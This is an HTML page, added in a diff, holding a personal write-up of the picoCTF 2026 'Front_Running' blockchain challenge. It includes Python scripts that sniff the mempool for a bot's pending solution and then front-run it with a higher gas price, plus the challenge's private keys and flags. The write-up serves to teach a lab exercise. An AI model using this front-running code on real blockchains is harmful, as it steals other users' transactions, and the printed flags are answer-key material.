@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>picoCTF Front_Running @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>picoCTF Blockchain Guide</h1>
+        <p>here's how to solve Front_Running</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Blockchain Guides</a>
+            <hr>
+            <h2>Front_Running</h2>
+            <pre>Name: Front_Running
+Description: A mysterious vault has been discovered on the blockchain. It's programmed to release a secret flag to anyone who can provide the correct pre-image to a specific hash. Our sensors indicate that a "Victim Bot" has found the answer and is currently trying to submit it, but they are being very stingy with their gas price. Contract: here The Ethereum node is available at: Eth node address: candy-mountain.picoctf.net:53552 Monitor the heist status and find your attacker credentials at here. NOTE: This server can take up to 5 minutes to start up. Please be patient.
+Author: OB
+Tags: Hard, Blockchain, picoCTF 2026
+Challenge from: picoCTF 2026
+Files: FrontRunning.sol
+Hints:
+1. Have you looked at the pending transactions in the mempool?
+2. What happens if two people submit the correct answer in the same block?
+3. How do you see what's waiting to be mined?</pre>
+            <h2>Theory</h2>
+            <p>According to the description, to get the flag we'll need to act fast and bribe other miners to process our flag transaction before anybody else's, so for that we'll have to skip to the solution part to look at the contract and the details webpage we are given.</p>
+            <h2>Solution</h2>
+            <p>So looking at the contract everything looks normal, we'll have a look at the credentials from the details webpage:</p>
+            <pre>Mission Objective
+A victim is attempting to solve the vault. But this particular victim is on a budget and is spending very little on gas. Their secret solution is currently sitting in the Mempool.
+
+Contract Address:
+0x5FbDB2315678afecb367f032d93F642f64180aa3
+
+Your Private Key:
+0x9a197a937d19b003b2313159853c0697307abd3b7ceccc13d094ada0bb025437
+
+Your Address:
+0x5aeE28860f25c0334562046D27285FA080425441
+
+Your Account Balance:
+10 ETH
+
+Heist Status
+VAULT SECURE: Scan the mempool for the victim's transaction.</pre>
+            <p>Okay, now that we have that, we'll have to do what I described in theory, first we'll need to watch the Mempool, because the bot that's doing transactions knows what the secret is, so we'll watch that place to get the secret from bot transactions:</p>
+            <pre>from web3 import Web3
+import time
+
+w3 = Web3(Web3.HTTPProvider("http://candy-mountain.picoctf.net:53552"))
+print("is connec:", w3.is_connected())
+
+TARGET = "0x5FbDB2315678afecb367f032d93F642f64180aa3".lower()
+
+while True:
+  pending_block = w3.eth.get_block('pending', full_transactions=True)
+  for tx in pending_block.transactions:
+    if tx.to and tx.to.lower() == TARGET:
+      print("hash:", tx.hash.hex())
+      print("input:", tx.input)
+  time.sleep(1)</pre>
+            <a href="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/Front_Running/mempool.py" target="_blank">Download mempool.py</a>
+            <p>So if we run this one, we should be able to get that secret we need for the main code (just remember to press Ctrl+C after it loads because for some reason it doesn't stop after getting the secret):</p>
+            <pre>(venv) shukularuni@SHUKULAP:~/pctf26/blocain$ python3 frontmem.py
+is connec: True
+hash: 52210dd05c07456481cd4a3355495c575a406bb25ddedd3c30b5d85e480cad9d
+input: b'v\xfe\x1e\x92\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17picoCTF{m3mp00l_p1r4t3}\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+^CTraceback (most recent call last):
+  File "/home/shukularuni/pctf26/blocain/frontmem.py", line 17, in &lt;module&gt;
+    time.sleep(1)
+KeyboardInterrupt</pre>
+            <p>Perfect, we have everything we need now, first we'll initialize Web3 to see that we can connect. Then we'll enter the contract address, our private key, and our own contract. Finally, we use the secret to bribe the other miners to let us process our transaction faster than the other guy, and after that we can request the flag (checking that it's not the same as the secret since that'd be a wrong flag). So if we write all of that as a python script we get this:</p>
+            <pre>from web3 import Web3
+
+rpc = "http://candy-mountain.picoctf.net:53552"
+w3 = Web3(Web3.HTTPProvider(rpc))
+print("is connec:", w3.is_connected())
+
+solution = "picoCTF{m3mp00l_p1r4t3}"
+private_key = "0xda591cde91e350937991740322a5af51f8326e96c8d4dbe52378fcfa16d00d0b"
+addr = "0x3A20a4A6d08c06Aa676Fec38EC62a77d94711E21"
+print("\nmemsolve thingy:", solution)
+
+abi = [{"inputs":[{"internalType":"string","name":"solution","type":"string"}],"name":"solve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]
+
+contract = w3.eth.contract(address="0x5FbDB2315678afecb367f032d93F642f64180aa3", abi=abi)
+
+print("\ntransaction do")
+nonce = w3.eth.get_transaction_count(addr)
+tx = contract.functions.solve(solution).build_transaction({"from": addr, "nonce": nonce, "gas": 200000, "gasPrice": w3.to_wei("50", "gwei")})
+signed_tx = w3.eth.account.sign_transaction(tx, private_key)
+tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
+print(w3.to_hex(tx_hash))
+
+print("\nwaiting for it to mine")
+receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+print("mined block", receipt.blockNumber)
+flag = contract.functions.getFlag().call()
+if solution == flag:
+  print("\nfail")
+  exit()
+print(flag)</pre>
+            <a href="https://archive.org/download/sh_w_imgstff_fgunp/picoctf/Front_Running/main.py" target="_blank">Download main.py</a>
+            <p>And if we run it, we should be able to get that flag:</p>
+            <pre>(venv) shukularuni@SHUKULAP:~/pctf26/blocain$ python3 front.py
+is connec: True
+
+memsolve thing: picoCTF{m3mp00l_p1r4t3}
+
+transaction do
+0x7ea695c18ae1aee116b905efc65a611429e2b87f21c9eb491bbdb3825ddca30c
+
+waiting for it to mine
+mined block 155
+picoCTF{m3mp00l_h31st_bb7e7913}</pre>
+            <p>There we go! That's the flag.</p>
+            <p>I rated this level as "good"! :3</p>
+            <hr>
+            <a target="_blank" href="https://play.picoctf.org/practice/challenge/760">https://play.picoctf.org/practice/challenge/760</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
